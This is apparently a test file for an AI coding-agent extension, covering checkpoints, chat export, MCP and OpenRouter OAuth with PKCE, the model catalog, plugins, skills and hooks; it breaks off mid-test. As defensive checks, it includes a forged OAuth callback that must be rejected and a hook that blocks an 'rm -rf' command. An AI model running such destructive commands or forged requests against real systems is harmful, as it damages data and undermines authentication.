// Feature modules without their own suite so far: checkpoints, chat export,
// presets, OpenRouter + MCP OAuth, model catalog, plugins, skills, hooks,
// browser helpers, local models and the OS sandbox helpers. Offline: every
// network call goes to a local mock server or a stubbed fetch.
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const { createHash } = require('crypto');
const Module = require('module');
const OUT = path.join(__dirname, '..', 'out');

// Minimal fake `vscode` for modelCatalog (Uri + workspace.fs).
class Uri {
	constructor(p) { this.fsPath = path.resolve(p); }
	static joinPath(u, ...parts) { return new Uri(path.join(u.fsPath, ...parts)); }
}
const fakeVscode = {
	Uri,
	window: { showInformationMessage: async () => undefined, createStatusBarItem: () => ({ show() {}, dispose() {} }) },
	StatusBarAlignment: { Right: 2 },
	InlineCompletionTriggerKind: { Automatic: 1, Invoke: 0 },
	workspace: {
		fs: {
			readFile: async (u) => new Uint8Array(fs.readFileSync(u.fsPath)),
			writeFile: async (u, b) => fs.writeFileSync(u.fsPath, Buffer.from(b)),
			createDirectory: async (u) => fs.mkdirSync(u.fsPath, { recursive: true })
		}
	}
};
const resolveFilename = Module._resolveFilename;
Module._resolveFilename = function (req, ...rest) { return req === 'vscode' ? 'vscode' : resolveFilename.call(this, req, ...rest); };
require.cache.vscode = { id: 'vscode', filename: 'vscode', loaded: true, exports: fakeVscode };

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'zfeat-'));
const tests = [];
const test = (name, fn) => tests.push([name, fn]);
const listen = (handler) => new Promise((r) => { const s = http.createServer(handler); s.listen(0, '127.0.0.1', () => r(s)); });
const close = (s) => new Promise((r) => s.close(r));
const body = (req) => new Promise((r) => { let b = ''; req.on('data', (c) => (b += c)); req.on('end', () => r(b)); });
const json = (res, status, obj, headers = {}) => { res.writeHead(status, { 'Content-Type': 'application/json', Connection: 'close', ...headers }); res.end(JSON.stringify(obj)); };

// ------------------------------------------------------------------ checkpoints

test('checkpoints: save / load / list order / skip huge files / remove', async () => {
	const { CheckpointStore } = require(OUT + '/checkpoints.js');
	const store = new CheckpointStore(path.join(tmp, 'cp'));
	store.save('s/1', { userId: 'u1', at: 1, files: { 'a.ts': { before: 'x', after: 'y' }, 'new.ts': { before: null, after: 'n' } } });
	await new Promise((r) => setTimeout(r, 15));
	store.save('s/1', { userId: 'u2', at: 2, files: { 'big.bin': { before: 'b'.repeat(2_000_001), after: '' }, 'a.ts': { before: 'y', after: null } } });
	assert.deepStrictEqual(store.list('s/1'), ['u1', 'u2'], 'oldest first');
	const one = store.load('s/1', 'u1');
	assert.strictEqual(one.files['new.ts'].before, null, 'null = file did not exist');
	const two = store.load('s/1', 'u2');
	assert.deepStrictEqual(two.skipped, ['big.bin']);
	assert.ok(!two.files['big.bin'] && two.files['a.ts'].after === null, 'deletions kept, huge files skipped');
	store.remove('s/1', 'u1');
	assert.deepStrictEqual(store.list('s/1'), ['u2']);
	assert.strictEqual(store.load('s/1', 'nope'), undefined);
	store.removeSession('s/1');
	assert.deepStrictEqual(store.list('s/1'), []);
});

test('checkpoints: keeps only the newest 150 per chat', () => {
	const { CheckpointStore } = require(OUT + '/checkpoints.js');
	const store = new CheckpointStore(path.join(tmp, 'cp2'));
	for (let i = 0; i < 152; i++) store.save('s', { userId: 'u' + String(i).padStart(3, '0'), at: i, files: {} });
	assert.ok(store.list('s').length <= 150);
});

// ------------------------------------------------------------------ chat export

test('chat export: markdown transcript + JSON + slug', () => {
	const { chatToMarkdown, chatToJson, fileSlug } = require(OUT + '/chatExport.js');
	const t0 = Date.UTC(2026, 0, 2, 3, 4, 5);
	const messages = [
		{ id: 'u', role: 'user', content: 'Fix it', attachments: ['a.png'], turn: { startedAt: t0, endedAt: t0 + 65_000, provider: 'Z', model: 'glm', usage: { input: 1000, output: 50, cached: 900 }, edits: [{ path: 'x.ts', added: 3, removed: 1 }] } },
		{ id: 't', role: 'assistant', kind: 'tool', content: '', approval: { id: 'a', kind: 'command', command: 'npm test', status: 'applied', result: 'exit code 0', auto: true } },
		{ id: 'e', role: 'assistant', kind: 'tool', content: '', approval: { id: 'b', kind: 'edit', path: 'x.ts', find: 'a', replace: 'b', status: 'rejected' } },
		{ id: 'q', role: 'assistant', content: '', question: { text: 'Which?', options: [], answer: 'A' } },
		{ id: 'r', role: 'assistant', content: 'Done — ```inner``` fence', model: 'glm' }
	];
	const md = chatToMarkdown(messages, { title: 'My chat', workspace: 'repo', exportedAt: t0 });
	assert.match(md, /^# My chat/);
	assert.match(md, /worked for 1m 5s · Z \/ glm · 1000 in \/ 50 out \/ 90% cached · edited `x.ts` \(\+3 −1\)/);
	assert.match(md, /\*\*Ran command\*\* \(auto-approved\)/);
	assert.match(md, /\*\*Edited `x.ts`\*\* \(rejected\)[\s\S]*- a\n\+ b/);
	assert.match(md, /\*\*Agent asked:\*\* Which\?[\s\S]*\*\*Answer:\*\* A/);
	assert.match(md, /## zer0ne · glm/);
	assert.ok(!/\n{3,}/.test(md), 'no blank-line runs');
	const j = JSON.parse(chatToJson(messages, { title: 'My chat', exportedAt: t0 }));
	assert.strictEqual(j.format, 'zer0ne-chat');
	assert.strictEqual(j.messages.length, 5);
	assert.strictEqual(fileSlug('Hello, Wörld! Fix #12'), 'hello-wörld-fix-12');
	assert.strictEqual(fileSlug('!!!'), 'chat');
});

// ------------------------------------------------------------------ presets

test('presets: unique ids, valid groups, safe base URLs, lookups', () => {
	const { PRESETS, presetById } = require(OUT + '/presets.js');
	const ids = PRESETS.map((p) => p.id);
	assert.strictEqual(new Set(ids).size, ids.length, 'unique ids');
	for (const p of PRESETS) {
		assert.ok(['custom', 'signin', 'plans', 'api', 'local', 'legacy'].includes(p.group), p.id + ' group ' + p.group);
		if (p.baseUrl && p.baseUrl !== 'vscode-lm') assert.ok(/^https:\/\//.test(p.baseUrl) || /^http:\/\/(localhost|127\.0\.0\.1)[:/]/.test(p.baseUrl), p.id + ' ' + p.baseUrl);
	}
	assert.strictEqual(presetById('ollama').group, 'local');
	assert.strictEqual(presetById('nope'), undefined);
	assert.strictEqual(presetById(undefined), undefined);
});

// ------------------------------------------------------------------ OpenRouter sign-in

test('OpenRouter OAuth: PKCE, unguessable callback path, key exchange', async () => {
	const { signInWithOpenRouter } = require(OUT + '/oauth.js');
	const realFetch = global.fetch;
	let exchange;
	global.fetch = async (url, init) => {
		if (String(url).startsWith('https://openrouter.ai/api/v1/auth/keys')) {
			exchange = JSON.parse(init.body);
			return new Response(JSON.stringify({ key: 'sk-or-test' }), { status: 200 });
		}
		return realFetch(url, init);
	};
	try {
		const key = await signInWithOpenRouter(async (authUrl) => {
			const u = new URL(authUrl);
			const cb = new URL(u.searchParams.get('callback_url'));
			assert.match(cb.pathname, /^\/callback\/[\w-]{16,}$/, 'nonce in the callback path');
			assert.strictEqual(u.searchParams.get('code_challenge_method'), 'S256');
			// A forged callback on the plain path is ignored.
			const forged = await realFetch(cb.origin + '/callback?code=evil');
			assert.strictEqual(forged.status, 404);
			await realFetch(cb.toString() + '?code=good-code');
			return true;
		});
		assert.strictEqual(key, 'sk-or-test');
		assert.strictEqual(exchange.code, 'good-code');
		assert.ok(exchange.code_verifier && exchange.code_challenge_method === 'S256');
	} finally {
		global.fetch = realFetch;
	}
});

// ------------------------------------------------------------------ MCP OAuth

test('MCP OAuth: 401 → discovery → registration → PKCE sign-in → tools → silent refresh', async () => {
	const { McpManager } = require(OUT + '/tools/mcp.js');
	const { parseWwwAuthenticate, canonicalResource } = require(OUT + '/tools/mcpOAuth.js');
	assert.deepStrictEqual(parseWwwAuthenticate('Bearer resource_metadata="https://x/.well-known/oauth-protected-resource", scope="read write"'), { resourceMetadata: 'https://x/.well-known/oauth-protected-resource', scope: 'read write' });
	assert.strictEqual(canonicalResource('https://Mcp.Example.com/mcp/#frag'), 'https://mcp.example.com/mcp');

	const valid = new Set();
	const codes = new Map();
	let registered = 0;
	let refreshes = 0;
	let base;
	const server = await listen(async (req, res) => {
		const url = new URL(req.url, base);
		if (url.pathname === '/.well-known/oauth-protected-resource/mcp' || url.pathname === '/.well-known/oauth-protected-resource') {
			return json(res, 200, { resource: base + '/mcp', authorization_servers: [base + '/auth'], scopes_supported: ['mcp'] });
		}
		if (url.pathname === '/.well-known/oauth-authorization-server/auth') {
			return json(res, 200, { issuer: base + '/auth', authorization_endpoint: base + '/auth/authorize', token_endpoint: base + '/auth/token', registration_endpoint: base + '/auth/register', code_challenge_methods_supported: ['S256'] });
		}
		if (url.pathname === '/auth/register') {
			const reg = JSON.parse(await body(req));
			assert.ok(reg.redirect_uris[0].startsWith('http://127.0.0.1:'));
			registered++;
			return json(res, 201, { client_id: 'client-' + registered });
		}
		if (url.pathname === '/auth/authorize') {
			assert.strictEqual(url.searchParams.get('resource'), base + '/mcp', 'RFC 8707 resource');
			assert.strictEqual(url.searchParams.get('scope'), 'mcp');
			const code = 'code-' + Math.random().toString(36).slice(2);
			codes.set(code, url.searchParams.get('code_challenge'));
			const back = new URL(url.searchParams.get('redirect_uri'));
			back.searchParams.set('code', code);
			back.searchParams.set('state', url.searchParams.get('state'));
			res.writeHead(302, { Location: back.toString(), Connection: 'close' });
			return res.end();
		}
		if (url.pathname === '/auth/token') {
			const f = new URLSearchParams(await body(req));
			if (f.get('grant_type') === 'authorization_code') {
				const challenge = createHash('sha256').update(f.get('code_verifier')).digest('base64url');
				assert.strictEqual(challenge, codes.get(f.get('code')), 'PKCE verifier matches');
				valid.add('AT1');
				return json(res, 200, { access_token: 'AT1', refresh_token: 'RT1', expires_in: 3600, token_type: 'Bearer' });
			}
			assert.strictEqual(f.get('grant_type'), 'refresh_token');
			assert.strictEqual(f.get('refresh_token'), 'RT1');
			refreshes++;
			valid.add('AT2');
			return json(res, 200, { access_token: 'AT2', expires_in: 3600 });
		}
		if (url.pathname === '/mcp') {
			if (req.method === 'GET') { res.writeHead(405, { Connection: 'close' }); return res.end(); }
			if (req.method === 'DELETE') { res.writeHead(202, { Connection: 'close' }); return res.end(); }
			const token = (req.headers.authorization || '').replace(/^Bearer /, '');
			if (!valid.has(token)) {
				return json(res, 401, { error: 'unauthorized' }, { 'WWW-Authenticate': `Bearer resource_metadata="${base}/.well-known/oauth-protected-resource/mcp"` });
			}
			const msg = JSON.parse(await body(req));
			if (msg.id === undefined) { res.writeHead(202, { Connection: 'close' }); return res.end(); }
			const result = msg.method === 'initialize' ? { protocolVersion: '2025-06-18', capabilities: { tools: {} }, serverInfo: { name: 'mock', version: '1' } } : msg.method === 'tools/list' ? { tools: [{ name: 'whoami', description: 'Who am I', inputSchema: { type: 'object', properties: {} } }] } : { content: [{ type: 'text', text: 'you are ' + token }] };
			return json(res, 200, { jsonrpc: '2.0', id: msg.id, result });
		}
		res.writeHead(404, { Connection: 'close' });
		res.end();
	});
	base = 'http://127.0.0.1:' + server.address().port;
	const vault = new Map();
	const auth = { get: async (k) => vault.get(k), set: async (k, v) => (v ? vault.set(k, v) : vault.delete(k)) };
	const mgr = new McpManager(() => undefined, () => undefined, auth);
	const cfg = { id: 'r1', name: 'remote', transport: 'http', command: '', args: [], env: {}, url: base + '/mcp', headers: {}, enabled: true };
	const waitState = async (want) => {
		for (let i = 0; i < 100; i++) {
			const st = mgr.statuses([cfg])[0];
			if (st.state === want) return st;
			await new Promise((r) => setTimeout(r, 30));
		}
		throw new Error('state never became ' + want + ': ' + JSON.stringify(mgr.statuses([cfg])[0]));
	};
	try {
		mgr.sync([cfg], true);
		const st = await waitState('auth');
		assert.match(st.error, /Sign in required/);
		// "Browser": follow the authorize redirect back to the loopback listener.
		await mgr.signIn('r1', async (u) => { await fetch(u); return true; });
		const ready = await waitState('ready');
		assert.strictEqual(ready.tools[0].name, 'whoami');
		assert.ok(ready.oauth, 'signed-in badge');
		assert.strictEqual(vault.get(base + '/mcp').refreshToken, 'RT1', 'tokens stored under the canonical resource');
		assert.match((await mgr.call('mcp__remote__whoami', {})).text, /AT1/);
		// Access token revoked server-side → one silent refresh, same call succeeds.
		valid.delete('AT1');
		assert.match((await mgr.call('mcp__remote__whoami', {})).text, /AT2/);
		assert.strictEqual(refreshes, 1);
		await mgr.signOut('r1');
		assert.strictEqual(vault.size, 0);
	} finally {
		mgr.dispose?.();
		for (const c of mgr.clients?.values?.() ?? []) c.stop();
		await close(server);
	}
});

// ------------------------------------------------------------------ model catalog

test('model catalog: parse models.dev, cache to disk, search, fuzzy lookup, offline fallback', async () => {
	const { ModelCatalog } = require(OUT + '/modelCatalog.js');
	const raw = {
		acme: { name: 'Acme AI', api: 'https://api.acme.test/v1', npm: '@ai-sdk/openai-compatible', models: { 'acme-1': { name: 'Acme 1', cost: { input: 1, output: 2, cache_read: 0.1 }, limit: { context: 128000, output: 8000 }, modalities: { input: ['text', 'image'] }, tool_call: true, reasoning: true } } },
		anthropic: { name: 'Anthropic', npm: '@ai-sdk/anthropic', models: { 'claude-x': { tool_call: true } } }
	};
	const parsed = ModelCatalog.parse(raw);
	assert.deepStrictEqual(parsed[0].models[0], { id: 'acme-1', name: 'Acme 1', priceIn: 1, priceOut: 2, priceCacheRead: 0.1, contextWindow: 128000, maxOutput: 8000, vision: true, tools: true, reasoning: true });
	assert.strictEqual(parsed[1].apiFormat, 'anthropic');
	assert.strictEqual(parsed[1].baseUrl, 'https://api.anthropic.com', 'first-party base URL filled in');

	const realFetch = global.fetch;
	let calls = 0;
	global.fetch = async (url) => { calls++; return new Response(JSON.stringify(raw), { status: 200 }); };
	const storage = new Uri(path.join(tmp, 'catalog'));
	const ctx = { globalState: { get: () => undefined, update: async () => undefined }, globalStorageUri: storage };
	try {
		const cat = new ModelCatalog(ctx);
		assert.strictEqual((await cat.get('acme')).models.length, 1);
		assert.ok(fs.existsSync(path.join(storage.fsPath, 'models-catalog.json')), 'cached on disk');
		assert.strictEqual((await cat.search('acm'))[0].id, 'acme');
		assert.strictEqual((await cat.lookup('vendor/acme-1:free')).id, 'acme-1', 'normalized match');
		// A new instance reads the fresh disk cache instead of the network.
		await new ModelCatalog(ctx).all();
		assert.strictEqual(calls, 1);
		// Offline with no cache → the bundled fallback list.
		global.fetch = async () => { throw new Error('offline'); };
		const offline = new ModelCatalog({ ...ctx, globalStorageUri: new Uri(path.join(tmp, 'catalog-none')) });
		assert.ok((await offline.get('openai')).models.length > 0);
	} finally {
		global.fetch = realFetch;
	}
});

test('custom models: persist individual settings, preserve overrides on refresh, and restore catalog management', async () => {
	const { ProvidersHost, customProviderInput } = require(OUT + '/host/providersHost.js');
	const { ProviderStore, normalizeModel } = require(OUT + '/providerStore.js');
	const state = new Map();
	const secrets = new Map();
	const context = {
		globalState: { get: (k, fallback) => state.has(k) ? state.get(k) : fallback, update: async (k, v) => state.set(k, v) },
		secrets: { get: async (k) => secrets.get(k), store: async (k, v) => secrets.set(k, v), delete: async (k) => secrets.delete(k) }
	};
	const store = new ProviderStore(context);
	let recommendation = { id: 'shared-model', contextWindow: 128000, maxOutput: 8192, vision: true, tools: false, reasoning: true, priceIn: 2, priceOut: 8 };
	const lookups = [];
	let catalogRefreshes = 0;
	const catalog = { all: async (force) => { if (force) catalogRefreshes++; return []; }, lookup: async (...args) => { lookups.push(args); return recommendation; } };
	const host = new ProvidersHost({ store, status() {}, sendState: async () => {} }, catalog);
	let fetched = false;
	host.fetchModelsFor = async () => { fetched = true; };
	const messages = [];
	const surface = { post: (m) => messages.push(m) };
	await host.handle(surface, { type: 'lookupModel', modelId: 'shared-model', baseUrl: 'https://api.example.com/v1', apiFormat: 'anthropic', requestId: 42 });
	assert.deepStrictEqual(lookups.at(-1), ['shared-model', undefined, { baseUrl: 'https://api.example.com/v1', apiFormat: 'anthropic' }], 'draft lookup uses the unsaved endpoint');
	assert.strictEqual(messages.at(-1).requestId, 42);
	const input = {
		type: 'addCustom', name: 'Draft provider', baseUrl: 'https://api.example.com/v1', apiFormat: 'anthropic', apiKey: 'test-only-key',
		models: [
			{ id: 'shared-model', smart: true, contextWindow: 64000, vision: false, priceIn: 0, manualFields: ['contextWindow', 'vision', 'priceIn'] },
			{ id: 'manual-model', smart: false, contextWindow: 32000, maxOutput: 2048, tools: false },
			{ id: ' shared-model ', contextWindow: 999 },
			{ id: 'automatic-model', smart: true }
		]
	};
	await host.handle(surface, input);
	const p = (await store.list())[0];
	assert.strictEqual(p.models.length, 3, 'structured IDs are trimmed and deduplicated');
	assert.ok(fetched, 'endpoint discovery still follows provider creation');
	assert.strictEqual(await store.getApiKey(p.id), 'test-only-key');
	assert.deepStrictEqual([p.models[0].contextWindow, p.models[0].maxOutput, p.models[0].vision, p.models[0].priceIn], [64000, 8192, false, 0]);
	assert.deepStrictEqual(p.models[0].manualFields, ['contextWindow', 'vision', 'priceIn']);
	assert.deepStrictEqual(p.models[2].manualFields, [], 'a catalog capability of false stays catalog-managed');
	assert.deepStrictEqual([p.models[1].contextWindow, p.models[1].maxOutput, p.models[1].tools], [32000, 2048, false]);
	assert.strictEqual((await new ProviderStore(context).get(p.id)).models[0].vision, false, 'explicit false survives reopening');
	recommendation = { ...recommendation, contextWindow: 256000, maxOutput: 16384, tools: true, priceIn: 5 };
	await host.handle(surface, { type: 'refreshModelInfo', id: p.id });
	assert.strictEqual(catalogRefreshes, 1, 'Refresh model info asks for current catalog data');
	const refreshed = (await store.get(p.id)).models;
	assert.deepStrictEqual([refreshed[0].contextWindow, refreshed[0].maxOutput, refreshed[0].vision, refreshed[0].priceIn, refreshed[0].tools], [64000, 16384, false, 0, true]);
	assert.strictEqual(refreshed[1].maxOutput, 2048, 'smart-off models stay manual');
	assert.strictEqual(refreshed[2].tools, true, 'catalog-managed false can change to true');
	await host.handle(surface, { type: 'saveModel', id: p.id, originalId: 'shared-model', model: { ...refreshed[0], manualFields: [] } });
	const restored = (await store.get(p.id)).models[0];
	assert.deepStrictEqual([restored.contextWindow, restored.vision, restored.priceIn], [256000, true, 5], 'removing overrides restores recommendations');
	const legacy = normalizeModel({ id: 'old-model', smart: true, tools: false });
	assert.deepStrictEqual(legacy.manualFields, ['tools'], 'keep previously saved tool overrides');
	for (const contextWindow of [0, -1, 1.5, Infinity, '100']) {
		assert.match(customProviderInput({ ...input, models: [{ id: 'bad', contextWindow }] }), /positive whole/);
		await assert.rejects(host.handle(surface, { type: 'saveModel', id: p.id, model: { id: 'bad', contextWindow } }), /positive whole/);
	}
	assert.match(customProviderInput({ ...input, models: [{ id: 'bad', priceIn: -1 }] }), /non-negative/);
	host.dispose();
});

test('connect-and-go: a saved or added key fills the model list without the pick dialog', async () => {
	const { ProvidersHost } = require(OUT + '/host/providersHost.js');
	const { ProviderStore } = require(OUT + '/providerStore.js');
	const state = new Map();
	const secrets = new Map();
	const context = {
		globalState: { get: (k, fallback) => state.has(k) ? state.get(k) : fallback, update: async (k, v) => state.set(k, v) },
		secrets: { get: async (k) => secrets.get(k), store: async (k, v) => secrets.set(k, v), delete: async (k) => secrets.delete(k) }
	};
	const store = new ProviderStore(context);
	const statuses = [];
	const host = new ProvidersHost({ store, status: (m, k) => statuses.push([m, k]), sendState: async () => {} }, { all: async () => [], lookup: async () => undefined });
	const messages = [];
	const surface = { post: (m) => messages.push(m) };
	const realFetch = global.fetch;
	try {
		// A curated plan endpoint (45 models, like OpenCode Go): everything lands enabled.
		global.fetch = async () => new Response(JSON.stringify({ data: Array.from({ length: 45 }, (_, i) => ({ id: 'plan-model-' + i })) }), { status: 200, headers: { 'content-type': 'application/json' } });
		const go = await store.add({ name: 'OpenCode Go', baseUrl: 'https://opencode.ai/zen/go/v1', apiFormat: 'openai', models: [] });
		await host.handle(surface, { type: 'setApiKey', id: go.id, apiKey: 'test-only-key' });
		const goP = await store.get(go.id);
		assert.strictEqual(goP.models.length, 45, 'the key alone fills the list');
		assert.ok(goP.models.every((m) => m.enabled), 'a curated plan starts fully on');
		assert.ok(!messages.some((m) => m.type === 'fetchedModels'), 'no pick dialog for the auto path');

		// A huge gateway: the full list is stored, well-known models start on (≤16).
		global.fetch = async () => new Response(JSON.stringify({ data: [
			...Array.from({ length: 30 }, (_, i) => ({ id: 'gpt-5-variant-' + i })),
			...Array.from({ length: 430 }, (_, i) => ({ id: 'obscure-' + i }))
		] }), { status: 200, headers: { 'content-type': 'application/json' } });
		const or = await store.add({ name: 'OpenRouter', baseUrl: 'https://openrouter.ai/api/v1', apiFormat: 'openai', models: [] });
		await host.handle(surface, { type: 'setApiKey', id: or.id, apiKey: 'test-only-key' });
		const orP = await store.get(or.id);
		assert.strictEqual(orP.models.length, 460, 'the whole list is kept');
		const on = orP.models.filter((m) => m.enabled);
		assert.ok(on.length <= 16 && on.length >= 10, 'only well-known models start enabled: ' + on.length);
		assert.ok(on.every((m) => /gpt-5/.test(m.id)));

		// A dead endpoint: a status message instead of silence.
		global.fetch = async () => { throw new Error('offline'); };
		const dead = await store.add({ name: 'Broken Plan', baseUrl: 'https://dead.example.com/v1', apiFormat: 'openai', models: [] });
		await host.handle(surface, { type: 'setApiKey', id: dead.id, apiKey: 'test-only-key' });
		assert.ok(statuses.at(-1)[0].includes('gave no model list'), 'the failure is reported, not swallowed');
	} finally {
		global.fetch = realFetch;
	}
	host.dispose();
});

test('model recommendations: prefer the endpoint and API format for overlapping IDs', async () => {
	const { ModelCatalog } = require(OUT + '/modelCatalog.js');
	const catalog = new ModelCatalog({ globalStorageUri: new Uri(tmp), globalState: { get: () => undefined, update: async () => {} } });
	catalog.all = async () => [
		{ id: 'first', apiFormat: 'openai', baseUrl: 'https://api.first.test/v1', models: [{ id: 'shared', contextWindow: 64000 }] },
		{ id: 'second', apiFormat: 'anthropic', baseUrl: 'https://api.second.test', models: [{ id: 'shared', contextWindow: 200000 }] }
	];
	assert.strictEqual((await catalog.lookup('shared', undefined, { baseUrl: 'https://api.second.test/', apiFormat: 'anthropic' })).contextWindow, 200000);
	assert.strictEqual((await catalog.lookup('vendor/shared:free', undefined, { baseUrl: 'https://api.second.test', apiFormat: 'anthropic' })).contextWindow, 200000);
	assert.strictEqual((await catalog.lookup('shared', undefined, { baseUrl: 'https://proxy.test', apiFormat: 'anthropic' })).contextWindow, 200000);
	assert.strictEqual((await catalog.lookup('shared', 'first', { apiFormat: 'anthropic' })).contextWindow, 64000, 'an explicit catalog provider takes priority');
	assert.strictEqual(await catalog.lookup('unknown', undefined, { apiFormat: 'anthropic' }), undefined);
});

// ------------------------------------------------------------------ plugins, skills, hooks

test('plugins: commands, agents (canWrite), skills, hooks.json and .mcp.json from one folder', () => {
	const { PluginHost, expandCommand } = require(OUT + '/tools/plugins.js');
	const user = path.join(tmp, 'plug-user');
	const pdir = path.join(user, 'plugins', 'review-kit');
	const w = (rel, text) => { fs.mkdirSync(path.dirname(path.join(pdir, rel)), { recursive: true }); fs.writeFileSync(path.join(pdir, rel), text); };
	w('.claude-plugin/plugin.json', JSON.stringify({ name: 'review-kit', version: '1.2.0', description: 'Reviews' }));
	w('commands/review.md', '---\ndescription: Review the diff\nargument-hint: <path>\n---\nReview $ARGUMENTS carefully.');
	w('agents/fixer.md', '---\nname: fixer\ndescription: Fixes things\ntools: Read, Edit, Bash\n---\nYou fix bugs.');
	w('agents/reader.md', '---\nname: reader\ndescription: Reads\ntools: Read, Grep\n---\nYou read.');
	w('skills/triage/SKILL.md', '---\nname: triage\ndescription: Triage issues\n---\nSteps.');
	w('hooks/hooks.json', JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'echo check', timeout: 5 }] }], Bogus: 'x' } }));
	w('.mcp.json', JSON.stringify({ mcpServers: { docs: { command: 'npx', args: ['-y', 'docs-mcp'] }, remote: { url: 'https://mcp.example.com/mcp', headers: { 'X-Key': 'k' } } } }));
	let disabled = [], activated = [];
	const host = new PluginHost(user, () => undefined, () => disabled, () => activated);
	const [info] = host.plugins();
	assert.strictEqual(info.name, 'review-kit');
	assert.deepStrictEqual(info.counts, { commands: 1, skills: 1, agents: 2, hooks: 1, mcp: 2 });
	assert.strictEqual(info.enabled, false, 'code components need explicit activation');
	activated = [info.activationKey];
	const cmd = host.commands().find((c) => c.name === 'review-kit:review');
	assert.ok(cmd && cmd.argumentHint === '<path>' && cmd.source === 'plugin:review-kit');
	assert.strictEqual(expandCommand(cmd.body, 'src/a.ts'), 'Review src/a.ts carefully.');
	const agents = host.agents();
	assert.strictEqual(agents.find((a) => a.name === 'review-kit-fixer').canWrite, true);
	assert.strictEqual(agents.find((a) => a.name === 'review-kit-reader').canWrite, false);
	assert.strictEqual(host.skillDirs()[0].plugin, 'review-kit');
	const hooks = host.hooks();
	assert.strictEqual(hooks.length, 1);
	assert.strictEqual(hooks[0].event, 'PreToolUse');
	const mcp = host.mcpServers();
	assert.deepStrictEqual(mcp.map((m) => m.transport).sort(), ['http', 'stdio']);
	disabled = ['review-kit'];
	assert.strictEqual(host.hooks().length, 0, 'disabled plugins contribute nothing');
	assert.ok(!host.commands().some((c) => c.name.startsWith('review-kit:')));
});

test('skills: save, list, read, catalog prompt, rename, remove', () => {
	const { SkillStore, parseSkill, slugify } = require(OUT + '/tools/skills.js');
	assert.strictEqual(slugify('My Great Skill!'), 'my-great-skill');
	assert.deepStrictEqual(parseSkill('---\nname: a\ndescription: "b c"\n---\nbody'), { name: 'a', description: 'b c', tierAlways: false, body: 'body' });
	assert.strictEqual(parseSkill('---\nname: pinned\ntier: always\n---\nbody').tierAlways, true);
	const ws = path.join(tmp, 'skill-ws');
	fs.mkdirSync(ws, { recursive: true });
	let off = [];
	const store = new SkillStore(path.join(tmp, 'skill-user'), () => ws, () => off);
	store.save({ name: 'Release Notes', description: 'Write release notes', body: 'Use the changelog.', scope: 'workspace' });
	const s = store.list().find((x) => x.name === 'release-notes');
	assert.ok(s && s.source === 'workspace' && s.enabled);
	assert.ok(fs.existsSync(path.join(ws, '.zer0ne', 'skills', 'release-notes', 'SKILL.md')));
	assert.strictEqual(store.read('release-notes').body, 'Use the changelog.');
	assert.match(store.promptCatalog(), /release-notes/);
	store.save({ name: 'changelog', description: 'Renamed', body: 'x', scope: 'workspace', previous: 'release-notes' });
	assert.ok(!store.list().some((x) => x.name === 'release-notes') && store.list().some((x) => x.name === 'changelog'));
	off = ['changelog'];
	assert.ok(!store.promptCatalog().includes('changelog'), 'disabled skills are not advertised');
	store.remove('changelog');
	assert.ok(!store.list().some((x) => x.name === 'changelog'));
});

test('hooks: matcher, exit 2 blocks (with feedback), UserPromptSubmit context, timeouts', async () => {
	const { runHooks } = require(OUT + '/tools/hooks.js');
	// Scripts in files: quoting inline JS differs between PowerShell and sh.
	let n = 0;
	const hook = (event, script, matcher = '', timeoutSec = 10) => {
		const file = path.join(tmp, 'hook' + ++n + '.js');
		fs.writeFileSync(file, script);
		const cmd = JSON.stringify(process.execPath) + ' ' + JSON.stringify(file);
		return { id: event + n, event, matcher, command: process.platform === 'win32' ? '& ' + cmd : cmd, enabled: true, timeoutSec };
	};
	const block = hook('PreToolUse', "process.stderr.write('no rm -rf');process.exit(2)", 'run_command');
	let r = await runHooks([block], 'PreToolUse', { tool: 'run_command' }, tmp, 'run_command');
	assert.ok(r.blocked && /no rm -rf/.test(r.feedback), JSON.stringify(r));
	r = await runHooks([block], 'PreToolUse', { tool: 'read_file' }, tmp, 'read_file');
	assert.ok(!r.blocked, 'matcher limits the hook');
	r = await runHooks([hook('UserPromptSubmit', "let s='';process.stdin.on('data',c=>s+=c).on('end',()=>console.log('ctx:'+JSON.parse(s).event))")], 'UserPromptSubmit', { prompt: 'hi' }, tmp);
	assert.match(r.context, /ctx:UserPromptSubmit/, 'payload on stdin, stdout becomes context');
	r = await runHooks([hook('PostToolUse', 'process.exit(2)')], 'PostToolUse', {}, tmp, 'x');
	assert.ok(!r.blocked, 'PostToolUse cannot block');
	r = await runHooks([{ ...hook('Stop', 'setTimeout(()=>{},60000)'), timeoutSec: 1 }], 'Stop', {}, tmp);
	assert.ok(r.log.join(' ').length > 0, 'timed-out hook is logged, not hung');
});

// ------------------------------------------------------------------ browser helpers

test('browser: snapshot description for the model', () => {
	const { describeSnapshot, findBrowser } = require(OUT + '/tools/browser.js');
	const d = describeSnapshot({ url: 'https://x.test', title: '', elements: '[1] button "Go"', text: 'a'.repeat(5000), scroll: '0/100' }, 100);
	assert.match(d, /^URL: https:\/\/x\.test\nTitle: \(untitled\)/);
	assert.match(d, /\[1\] button "Go"/);
	assert.ok(d.endsWith('a'.repeat(100)), 'text clipped');
	assert.notStrictEqual(findBrowser(path.join(tmp, 'no-such-browser.exe')), path.join(tmp, 'no-such-browser.exe'), 'a missing custom path is not used (falls back to auto-detect)');
});

// ------------------------------------------------------------------ local models

test('local models: machine fit ratings (GPU, unified, CPU-only)', () => {
	const { machineCapacity, rateFit, fitAdvice } = require(OUT + '/localModels.js');
	const base = { platform: 'x', cpu: 'c', cores: 8 };
	const gpu = machineCapacity({ ...base, totalMemoryBytes: 64e9, gpuMemoryBytes: 24e9, unifiedMemory: false });
	assert.strictEqual(rateFit(14, gpu), 'fits');
	assert.strictEqual(rateFit(30, gpu), 'tight');
	assert.strictEqual(rateFit(65, gpu), 'too-large');
	const mac = machineCapacity({ ...base, totalMemoryBytes: 32e9, unifiedMemory: true });
	assert.strictEqual(rateFit(19, mac), 'fits', '75% of unified memory');
	const cpu = machineCapacity({ ...base, totalMemoryBytes: 16e9, unifiedMemory: false });
	assert.strictEqual(rateFit(4.7, cpu), 'fits');
	assert.strictEqual(rateFit(9, cpu), 'tight');
	assert.match(fitAdvice('big:1', 65, cpu), /needs about 78 GB/);
	assert.strictEqual(rateFit(0, cpu), undefined);
});

test('local models: engine fit defaults scale with the machine (context tier, margin, cache reserve)', () => {
	const { engineFit } = require(OUT + '/localModels.js');
	const GIB = 1024 ** 3;
